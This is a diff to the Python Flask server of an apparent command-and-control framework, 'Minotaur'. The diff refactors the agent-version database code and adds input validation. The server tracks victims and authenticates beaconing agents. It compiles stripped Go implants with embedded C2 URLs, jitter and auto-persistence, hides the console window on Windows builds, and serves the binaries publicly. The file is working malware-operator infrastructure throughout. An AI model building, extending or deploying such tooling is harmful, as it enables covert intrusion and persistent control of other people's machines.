@@ -2,13 +2,13 @@ import os
 import subprocess
 import tempfile
 import shutil
-import glob
 import sqlite3
 import datetime
 from datetime import timezone
-import uuid
 import base64
 import threading
+import re
+
 from flask import Flask, render_template, request, jsonify, send_file, send_from_directory
 from flask_socketio import SocketIO
 from cryptography.hazmat.primitives.asymmetric import rsa
@@ -31,14 +31,21 @@ os.makedirs(os.path.dirname(DB_PATH), exist_ok=True)
 AGENT_STORAGE = os.path.join(os.path.dirname(__file__), '../web/static/agents')
 os.makedirs(AGENT_STORAGE, exist_ok=True)
 
-def clean_old_agents(goos, goarch):
-    pattern = f"minotaur_agent_{goos}_{goarch}*"
-    files = glob.glob(os.path.join(AGENT_STORAGE, pattern))
-    if not files:
-        return
-    files.sort(key=os.path.getmtime)
-    for f in files[:-1]:
-        os.remove(f)
+# Whitelist regex for OS/ARCH (alphanumeric, underscores, dashes)
+VALID_GO_PARAM = re.compile(r'^[a-zA-Z0-9_\-]+$')
+
+def sanitize_for_go_string(s: str) -> str:
+    """Escape a string to be safely inserted inside a Go double-quoted string literal."""
+    return s.replace('\\', '\\\\').replace('"', '\\"').replace('\n', '\\n')
+
+def init_db():
+    """Enable WAL mode for better concurrency."""
+    conn = sqlite3.connect(DB_PATH)
+    conn.execute("PRAGMA journal_mode=WAL")
+    conn.close()
+
+# Call early, before any requests
+init_db()
 
 # ---------- Create the two Flask apps ----------
 agent_app = Flask(__name__)                     # for agent communication (public)
@@ -46,7 +53,7 @@ agent_app.config['SECRET_KEY'] = 'change-this-in-production'
 dashboard_app = Flask(__name__, template_folder='../web/templates', static_folder='../web/static')
 dashboard_app.config['SECRET_KEY'] = 'change-this-in-production'
 
-# WebSocket only for the dashboard (real‑time updates)
+# WebSocket only for the dashboard
 socketio = SocketIO(dashboard_app, cors_allowed_origins="*", async_mode='threading')
 
 # Instantiate managers (shared between both apps)
@@ -57,6 +64,80 @@ cmd_handler = CommandHandler(victim_mgr)
 agent_mgr = AgentManager(socketio)
 activity_logger = ActivityLogger()
 logger = setup_logger()
+
+# ---------- Shared helper for agent version management ----------
+def _get_db():
+    """Get a new database connection (each call creates a new one for thread safety)."""
+    return sqlite3.connect(DB_PATH)
+
+def get_agent_versions_logic():
+    conn = _get_db()
+    c = conn.cursor()
+    c.execute("SELECT version, platform, filename, compiled_at, size FROM agent_versions ORDER BY compiled_at DESC")
+    rows = c.fetchall()
+    c.execute("SELECT platform, version FROM agent_current_version")
+    current = {row[0]: row[1] for row in c.fetchall()}
+    conn.close()
+    return [
+        {
+            'version': r[0],
+            'platform': r[1],
+            'filename': r[2],
+            'compiled_at': r[3],
+            'size': r[4] if r[4] is not None else 0,
+            'is_current': current.get(r[1]) == r[0]
+        }
+        for r in rows
+    ]
+
+def set_current_version_logic(platform, version):
+    conn = _get_db()
+    c = conn.cursor()
+    c.execute("INSERT OR REPLACE INTO agent_current_version (platform, version) VALUES (?,?)", (platform, version))
+    conn.commit()
+    conn.close()
+
+def delete_agent_version_logic(version, platform):
+    goos, goarch = platform.split('/')
+    filename = f"minotaur_agent_{goos}_{goarch}_{version}"
+    if goos == 'windows':
+        filename += '.exe'
+    version_dir = os.path.join(AGENT_STORAGE, 'versions', platform.replace('/', '_'))
+    full_path = os.path.join(version_dir, filename)
+    if os.path.exists(full_path):
+        os.remove(full_path)
+    conn = _get_db()
+    c = conn.cursor()
+    c.execute("DELETE FROM agent_versions WHERE version=? AND platform=?", (version, platform))
+    conn.commit()
+    conn.close()
+
+def list_agent_files_logic():
+    conn = _get_db()
+    c = conn.cursor()
+    c.execute("SELECT platform, version FROM agent_current_version")
+    current_versions = c.fetchall()
+    conn.close()
+    files = []
+    for platform, version in current_versions:
+        goos, goarch = platform.split('/')
+        filename = f"minotaur_agent_{goos}_{goarch}_{version}"
+        if goos == 'windows':
+            filename += '.exe'
+        version_dir = os.path.join(AGENT_STORAGE, 'versions', platform.replace('/', '_'))
+        full_path = os.path.join(version_dir, filename)
+        if os.path.exists(full_path):
+            rel_path = os.path.relpath(full_path, os.path.join(os.path.dirname(__file__), '../web/static')).replace('\\', '/')
+            url = f'/static/{rel_path}'
+            files.append({
+                'filename': filename,
+                'url': url,
+                'platform': platform,
+                'version': version,
+                'size': os.path.getsize(full_path),
+                'modified': datetime.datetime.fromtimestamp(os.path.getmtime(full_path), tz=timezone.utc).isoformat()
+            })
+    return files
 
 # ---------- Shared helper for build endpoint ----------
 def build_agent_impl(data):
@@ -71,6 +152,10 @@ def build_agent_impl(data):
     goos = data.get('goos', 'windows')
     goarch = data.get('goarch', 'amd64')
 
+    # Validate goos/goarch against path traversal
+    if not VALID_GO_PARAM.match(goos) or not VALID_GO_PARAM.match(goarch):
+        return {'error': 'Invalid goos or goarch'}, 400
+
     version = datetime.datetime.now(timezone.utc).strftime('%Y%m%d-%H%M%S')
     platform = f"{goos}/{goarch}"
 
@@ -81,7 +166,11 @@ def build_agent_impl(data):
     if jitter < 0:
         jitter = 0
 
-    # Read the main agent template (common code)
+    # Escape strings for safe insertion into Go source
+    c2_url_safe = sanitize_for_go_string(c2_url)
+    user_agent_safe = sanitize_for_go_string(user_agent)
+
+    # Read the main agent template
     common_path = os.path.join(os.path.dirname(__file__), '../agents/go/agent.go')
     unix_path = os.path.join(os.path.dirname(__file__), '../agents/go/agent_unix.go')
     win_path = os.path.join(os.path.dirname(__file__), '../agents/go/agent_windows.go')
@@ -107,13 +196,14 @@ def build_agent_impl(data):
             format=serialization.PublicFormat.SubjectPublicKeyInfo
         ).decode('utf-8')
         agent_mgr.store_rsa_keypair(version, platform, private_key_pem, public_key_pem)
+        # Escape backticks for Go raw string literals
         public_key_pem = public_key_pem.replace('`', '` + "`" + `')
 
-    # Replace placeholders in the common template
-    agent_code = agent_code.replace('{{ .C2URL }}', c2_url)
+    # Replace placeholders (using already escaped strings)
+    agent_code = agent_code.replace('{{ .C2URL }}', c2_url_safe)
     agent_code = agent_code.replace('{{ .BeaconDelay }}', str(beacon_delay))
     agent_code = agent_code.replace('{{ .Jitter }}', str(jitter))
-    agent_code = agent_code.replace('{{ .UserAgent }}', user_agent)
+    agent_code = agent_code.replace('{{ .UserAgent }}', user_agent_safe)
     agent_code = agent_code.replace('{{ .InsecureTLS }}', str(insecure_tls).lower())
     agent_code = agent_code.replace('{{ .AutoPersistence }}', str(auto_persistence).lower())
     agent_code = agent_code.replace('{{ .DebugMode }}', str(debug_mode).lower())
@@ -123,89 +213,86 @@ def build_agent_impl(data):
 
     # Create temporary directory
     temp_dir = tempfile.mkdtemp()
+    try:
+        # Write main.go
+        go_file = os.path.join(temp_dir, 'main.go')
+        with open(go_file, 'w') as f:
+            f.write(agent_code)
 
-    # Write main.go
-    go_file = os.path.join(temp_dir, 'main.go')
-    with open(go_file, 'w') as f:
-        f.write(agent_code)
+        # Copy platform‑specific files (if they exist)
+        if os.path.exists(unix_path):
+            with open(unix_path, 'r') as uf:
+                unix_code = uf.read()
+            with open(os.path.join(temp_dir, 'agent_unix.go'), 'w') as uf:
+                uf.write(unix_code)
 
-    # Copy platform‑specific files (if they exist)
-    if os.path.exists(unix_path):
-        with open(unix_path, 'r') as uf:
-            unix_code = uf.read()
-        unix_go_file = os.path.join(temp_dir, 'agent_unix.go')
-        with open(unix_go_file, 'w') as uf:
-            uf.write(unix_code)
+        if os.path.exists(win_path):
+            with open(win_path, 'r') as wf:
+                win_code = wf.read()
+            with open(os.path.join(temp_dir, 'agent_windows.go'), 'w') as wf:
+                wf.write(win_code)
 
-    if os.path.exists(win_path):
-        with open(win_path, 'r') as wf:
-            win_code = wf.read()
-        win_go_file = os.path.join(temp_dir, 'agent_windows.go')
-        with open(win_go_file, 'w') as wf:
-            wf.write(win_code)
+        # Initialize Go module
+        subprocess.run(['go', 'mod', 'init', 'minotaur-agent'], cwd=temp_dir, capture_output=True, text=True)
+        subprocess.run(['go', 'mod', 'tidy'], cwd=temp_dir, capture_output=True, text=True)
 
-    # Initialise Go module
-    subprocess.run(['go', 'mod', 'init', 'minotaur-agent'], cwd=temp_dir, capture_output=True, text=True)
-    subprocess.run(['go', 'mod', 'tidy'], cwd=temp_dir, capture_output=True, text=True)
-
-    output_name = f'minotaur_agent_{goos}_{goarch}_{version}'
-    if goos == 'windows':
-        output_name += '.exe'
-
-    if debug_mode:
-        build_cmd = ['go', 'build', '-o', output_name]
-    else:
+        output_name = f'minotaur_agent_{goos}_{goarch}_{version}'
         if goos == 'windows':
-            build_cmd = ['go', 'build', '-ldflags=-s -w -H windowsgui', '-o', output_name]
+            output_name += '.exe'
+
+        if debug_mode:
+            build_cmd = ['go', 'build', '-o', output_name]
         else:
-            build_cmd = ['go', 'build', '-ldflags=-s -w', '-o', output_name]
+            if goos == 'windows':
+                build_cmd = ['go', 'build', '-ldflags=-s -w -H windowsgui', '-o', output_name]
+            else:
+                build_cmd = ['go', 'build', '-ldflags=-s -w', '-o', output_name]
 
-    env = os.environ.copy()
-    env['GOOS'] = goos
-    env['GOARCH'] = goarch
-    env['CGO_ENABLED'] = '0'
+        env = os.environ.copy()
+        env['GOOS'] = goos
+        env['GOARCH'] = goarch
+        env['CGO_ENABLED'] = '0'
 
-    result = subprocess.run(build_cmd, cwd=temp_dir, env=env, capture_output=True, text=True)
+        result = subprocess.run(build_cmd, cwd=temp_dir, env=env, capture_output=True, text=True)
 
-    if result.returncode != 0:
+        if result.returncode != 0:
+            return {'error': f'Build failed: {result.stderr}'}, 500
+
+        binary_path = os.path.join(temp_dir, output_name)
+        version_dir = os.path.join(AGENT_STORAGE, 'versions', platform.replace('/', '_'))
+        os.makedirs(version_dir, exist_ok=True)
+        storage_path = os.path.join(version_dir, output_name)
+        shutil.copy(binary_path, storage_path)
+
+        # Record version in database
+        conn = _get_db()
+        c = conn.cursor()
+        c.execute('''CREATE TABLE IF NOT EXISTS agent_versions (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            version TEXT NOT NULL,
+            platform TEXT NOT NULL,
+            filename TEXT NOT NULL,
+            compiled_at TEXT,
+            size INTEGER
+        )''')
+        c.execute('''CREATE TABLE IF NOT EXISTS agent_current_version (
+            platform TEXT PRIMARY KEY,
+            version TEXT NOT NULL
+        )''')
+        now = datetime.datetime.now(timezone.utc).isoformat()
+        c.execute("INSERT INTO agent_versions (version, platform, filename, compiled_at, size) VALUES (?,?,?,?,?)",
+                  (version, platform, output_name, now, os.path.getsize(storage_path)))
+        c.execute("SELECT version FROM agent_current_version WHERE platform=?", (platform,))
+        if not c.fetchone():
+            c.execute("INSERT INTO agent_current_version (platform, version) VALUES (?,?)", (platform, version))
+        conn.commit()
+        conn.close()
+
+        return {'status': 'success', 'version': version, 'platform': platform, 'filename': output_name}, 200
+    finally:
         shutil.rmtree(temp_dir)
-        return {'error': f'Build failed: {result.stderr}'}, 500
 
-    binary_path = os.path.join(temp_dir, output_name)
-
-    version_dir = os.path.join(AGENT_STORAGE, 'versions', platform.replace('/', '_'))
-    os.makedirs(version_dir, exist_ok=True)
-    storage_path = os.path.join(version_dir, output_name)
-    shutil.copy(binary_path, storage_path)
-
-    # Record version in database
-    conn = sqlite3.connect(DB_PATH)
-    c = conn.cursor()
-    c.execute('''CREATE TABLE IF NOT EXISTS agent_versions (
-        id INTEGER PRIMARY KEY AUTOINCREMENT,
-        version TEXT NOT NULL,
-        platform TEXT NOT NULL,
-        filename TEXT NOT NULL,
-        compiled_at TEXT,
-        size INTEGER
-    )''')
-    c.execute('''CREATE TABLE IF NOT EXISTS agent_current_version (
-        platform TEXT PRIMARY KEY,
-        version TEXT NOT NULL
-    )''')
-    now = datetime.datetime.now(timezone.utc).isoformat()
-    c.execute("INSERT INTO agent_versions (version, platform, filename, compiled_at, size) VALUES (?,?,?,?,?)",
-              (version, platform, output_name, now, os.path.getsize(storage_path)))
-    c.execute("SELECT version FROM agent_current_version WHERE platform=?", (platform,))
-    if not c.fetchone():
-        c.execute("INSERT INTO agent_current_version (platform, version) VALUES (?,?)", (platform, version))
-    conn.commit()
-    conn.close()
-
-    shutil.rmtree(temp_dir)
-    return {'status': 'success', 'version': version, 'platform': platform, 'filename': output_name}, 200
-
-# ---------- Agent API endpoints (served on port 5000) ----------
+# ---------- Agent API endpoints (port 5000) ----------
 @agent_app.route('/api/agent/authenticate', methods=['POST'])
 def agent_authenticate():
     data = request.json
@@ -223,7 +310,7 @@ def agent_authenticate():
         challenge = private_key.decrypt(encrypted, padding.PKCS1v15())
         return jsonify({'challenge': base64.b64encode(challenge).decode()})
     except Exception as e:
-        return jsonify({'error': str(e)}), 500
+        return jsonify({'error': 'Authentication failed: ' + str(e)}), 400
 
 @agent_app.route('/api/agent/register', methods=['POST'])
 def agent_register():
@@ -292,26 +379,10 @@ def build_agent_api():
     resp, code = build_agent_impl(request.json)
     return jsonify(resp), code
 
+# Shared version management endpoints on agent_app (called by agents if needed)
 @agent_app.route('/api/agent/versions', methods=['GET'])
 def get_agent_versions_api():
-    conn = sqlite3.connect(DB_PATH)
-    c = conn.cursor()
-    c.execute("SELECT version, platform, filename, compiled_at, size FROM agent_versions ORDER BY compiled_at DESC")
-    rows = c.fetchall()
-    c.execute("SELECT platform, version FROM agent_current_version")
-    current = {row[0]: row[1] for row in c.fetchall()}
-    conn.close()
-    versions = []
-    for r in rows:
-        versions.append({
-            'version': r[0],
-            'platform': r[1],
-            'filename': r[2],
-            'compiled_at': r[3],
-            'size': r[4] if r[4] is not None else 0,
-            'is_current': current.get(r[1]) == r[0]
-        })
-    return jsonify(versions)
+    return jsonify(get_agent_versions_logic())
 
 @agent_app.route('/api/agent/set_current_version', methods=['POST'])
 def set_current_version_api():
@@ -320,11 +391,7 @@ def set_current_version_api():
     version = data.get('version')
     if not platform or not version:
         return jsonify({'error': 'Platform and version required'}), 400
-    conn = sqlite3.connect(DB_PATH)
-    c = conn.cursor()
-    c.execute("INSERT OR REPLACE INTO agent_current_version (platform, version) VALUES (?,?)", (platform, version))
-    conn.commit()
-    conn.close()
+    set_current_version_logic(platform, version)
     return jsonify({'status': 'success'})
 
 @agent_app.route('/api/agent/delete_version', methods=['POST'])
@@ -334,54 +401,18 @@ def delete_agent_version_api():
     platform = data.get('platform')
     if not version or not platform:
         return jsonify({'error': 'Version and platform required'}), 400
-    goos, goarch = platform.split('/')
-    filename = f"minotaur_agent_{goos}_{goarch}_{version}"
-    if goos == 'windows':
-        filename += '.exe'
-    version_dir = os.path.join(AGENT_STORAGE, 'versions', platform.replace('/', '_'))
-    full_path = os.path.join(version_dir, filename)
-    if os.path.exists(full_path):
-        os.remove(full_path)
-    conn = sqlite3.connect(DB_PATH)
-    c = conn.cursor()
-    c.execute("DELETE FROM agent_versions WHERE version=? AND platform=?", (version, platform))
-    conn.commit()
-    conn.close()
+    delete_agent_version_logic(version, platform)
     return jsonify({'status': 'success'})
 
 @agent_app.route('/api/agents/list')
 def list_agent_files_api():
-    conn = sqlite3.connect(DB_PATH)
-    c = conn.cursor()
-    c.execute("SELECT platform, version FROM agent_current_version")
-    current_versions = c.fetchall()
-    conn.close()
-    files = []
-    for platform, version in current_versions:
-        goos, goarch = platform.split('/')
-        filename = f"minotaur_agent_{goos}_{goarch}_{version}"
-        if goos == 'windows':
-            filename += '.exe'
-        version_dir = os.path.join(AGENT_STORAGE, 'versions', platform.replace('/', '_'))
-        full_path = os.path.join(version_dir, filename)
-        if os.path.exists(full_path):
-            rel_path = os.path.relpath(full_path, os.path.join(os.path.dirname(__file__), '../web/static')).replace('\\', '/')
-            url = f'/static/{rel_path}'
-            files.append({
-                'filename': filename,
-                'url': url,
-                'platform': platform,
-                'version': version,
-                'size': os.path.getsize(full_path),
-                'modified': datetime.datetime.fromtimestamp(os.path.getmtime(full_path), tz=timezone.utc).isoformat()
-            })
-    return jsonify(files)
+    return jsonify(list_agent_files_logic())
 
 @agent_app.route('/static/agents/<path:filename>')
 def serve_agent_binary(filename):
     return send_from_directory(AGENT_STORAGE, filename)
 
-# ---------- Dashboard endpoints (served on port 5001, localhost) ----------
+# ---------- Dashboard endpoints (port 5001, localhost) ----------
 @dashboard_app.route('/')
 def index():
     return render_template('dashboard.html')
@@ -455,33 +486,15 @@ def clear_all_agents():
     agent_mgr.clear_all_agents()
     return jsonify({'status': 'cleared'})
 
-# Build endpoint is also needed on dashboard because the frontend calls it from port 5001
 @dashboard_app.route('/api/build_agent', methods=['POST'])
 def build_agent_dashboard():
     resp, code = build_agent_impl(request.json)
     return jsonify(resp), code
 
-# Version management endpoints for dashboard
+# Dashboard version management (reuse same logic)
 @dashboard_app.route('/api/agent/versions', methods=['GET'])
 def get_agent_versions_dashboard():
-    conn = sqlite3.connect(DB_PATH)
-    c = conn.cursor()
-    c.execute("SELECT version, platform, filename, compiled_at, size FROM agent_versions ORDER BY compiled_at DESC")
-    rows = c.fetchall()
-    c.execute("SELECT platform, version FROM agent_current_version")
-    current = {row[0]: row[1] for row in c.fetchall()}
-    conn.close()
-    versions = []
-    for r in rows:
-        versions.append({
-            'version': r[0],
-            'platform': r[1],
-            'filename': r[2],
-            'compiled_at': r[3],
-            'size': r[4] if r[4] is not None else 0,
-            'is_current': current.get(r[1]) == r[0]
-        })
-    return jsonify(versions)
+    return jsonify(get_agent_versions_logic())
 
 @dashboard_app.route('/api/agent/set_current_version', methods=['POST'])
 def set_current_version_dashboard():
@@ -490,11 +503,7 @@ def set_current_version_dashboard():
     version = data.get('version')
     if not platform or not version:
         return jsonify({'error': 'Platform and version required'}), 400
-    conn = sqlite3.connect(DB_PATH)
-    c = conn.cursor()
-    c.execute("INSERT OR REPLACE INTO agent_current_version (platform, version) VALUES (?,?)", (platform, version))
-    conn.commit()
-    conn.close()
+    set_current_version_logic(platform, version)
     return jsonify({'status': 'success'})
 
 @dashboard_app.route('/api/agent/delete_version', methods=['POST'])
@@ -504,48 +513,12 @@ def delete_agent_version_dashboard():
     platform = data.get('platform')
     if not version or not platform:
         return jsonify({'error': 'Version and platform required'}), 400
-    goos, goarch = platform.split('/')
-    filename = f"minotaur_agent_{goos}_{goarch}_{version}"
-    if goos == 'windows':
-        filename += '.exe'
-    version_dir = os.path.join(AGENT_STORAGE, 'versions', platform.replace('/', '_'))
-    full_path = os.path.join(version_dir, filename)
-    if os.path.exists(full_path):
-        os.remove(full_path)
-    conn = sqlite3.connect(DB_PATH)
-    c = conn.cursor()
-    c.execute("DELETE FROM agent_versions WHERE version=? AND platform=?", (version, platform))
-    conn.commit()
-    conn.close()
+    delete_agent_version_logic(version, platform)
     return jsonify({'status': 'success'})
 
 @dashboard_app.route('/api/agents/list')
 def list_agent_files_dashboard():
-    conn = sqlite3.connect(DB_PATH)
-    c = conn.cursor()
-    c.execute("SELECT platform, version FROM agent_current_version")
-    current_versions = c.fetchall()
-    conn.close()
-    files = []
-    for platform, version in current_versions:
-        goos, goarch = platform.split('/')
-        filename = f"minotaur_agent_{goos}_{goarch}_{version}"
-        if goos == 'windows':
-            filename += '.exe'
-        version_dir = os.path.join(AGENT_STORAGE, 'versions', platform.replace('/', '_'))
-        full_path = os.path.join(version_dir, filename)
-        if os.path.exists(full_path):
-            rel_path = os.path.relpath(full_path, os.path.join(os.path.dirname(__file__), '../web/static')).replace('\\', '/')
-            url = f'/static/{rel_path}'
-            files.append({
-                'filename': filename,
-                'url': url,
-                'platform': platform,
-                'version': version,
-                'size': os.path.getsize(full_path),
-                'modified': datetime.datetime.fromtimestamp(os.path.getmtime(full_path), tz=timezone.utc).isoformat()
-            })
-    return jsonify(files)
+    return jsonify(list_agent_files_logic())
 
 # Port management endpoints
 @dashboard_app.route('/api/open_port', methods=['POST'])
@@ -670,7 +643,7 @@ def export_logs():
     data = BytesIO(content.encode('utf-8'))
     return send_file(data, as_attachment=True, download_name=filename, mimetype='text/plain')
 
-# WebSocket events for dashboard (real‑time)
+# WebSocket events for dashboard
 @socketio.on('connect')
 def handle_connect():
     logger.info(f"Dashboard client connected: {request.sid}")
@@ -687,8 +660,6 @@ def run_dashboard():
     socketio.run(dashboard_app, host='127.0.0.1', port=5001, debug=False, use_reloader=False)
 
 if __name__ == '__main__':
-    # Start the agent API in a background thread
     agent_thread = threading.Thread(target=run_agent_api, daemon=True)
     agent_thread.start()
-    # Run the dashboard in the main thread
     run_dashboard()
